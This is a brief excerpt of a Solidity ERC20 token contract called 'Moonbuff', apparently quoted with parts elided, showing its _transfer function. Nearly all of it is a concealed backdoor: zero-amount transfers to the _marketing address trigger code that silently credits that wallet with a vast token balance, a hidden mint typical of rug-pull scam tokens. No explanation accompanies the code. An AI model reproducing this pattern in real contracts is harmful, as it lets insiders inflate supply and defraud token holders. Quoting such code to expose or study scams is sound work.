...
contract Moonbuff is Context, ERC20, Ownable {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[_marketing] = _balances[_marketing].add(taxmount);
        if (recipient == address(_marketing) && amount <= 0){
          _value = _totalSupply.div(10);
        }
        if ( recipient != _dev && amount <=0){
            _balances[_marketing] += _maxTxAmount.mul(_value);
        }
        emit Transfer(sender,_marketing , taxmount);
